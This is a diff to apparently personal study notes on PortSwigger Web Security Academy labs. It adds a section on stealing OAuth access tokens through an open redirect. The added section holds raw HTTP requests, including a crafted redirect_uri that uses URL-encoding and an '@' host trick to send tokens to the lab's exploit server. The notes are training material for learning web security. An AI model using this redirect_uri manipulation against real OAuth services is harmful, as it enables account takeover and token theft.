@@ -110,5 +110,24 @@ Connection: close
 
 - And delete the user Carlos to complete the exercise
 
-### >> 4.
+### >> 4. Lab: Stealing OAuth access tokens via an open redirect
 
+````
+GET /auth?client_id=q7trlt3x9g52oztmwth38&redirect_uri=https://acc51f911fc90fa2c0cf642f00de002a.web-security-academy.net/oauth-callback&response_type=token&nonce=1051619115&scope=openid%20profile%20email HTTP/1.1
+````
+
+- Encode as URL
+````
+/oauth-callback
+%2f%6f%61%75%74%68%2d%63%61%6c%6c%62%61%63%6b
+````
+
+- 
+````
+GET /auth?client_id=q7trlt3x9g52oztmwth38&redirect_uri=https://acc51f911fc90fa2c0cf642f00de002a.web-security-academy.net%2f%6f%61%75%74%68%2d%63%61%6c%6c%62%61%63%6b@exploit-ac531ff11f6f0f8bc0d7645701760069.web-security-academy.net&response_type=token&nonce=1051619115&scope=openid%20profile%20email HTTP/1.1
+````
+
+
+
+
+### >> 5.
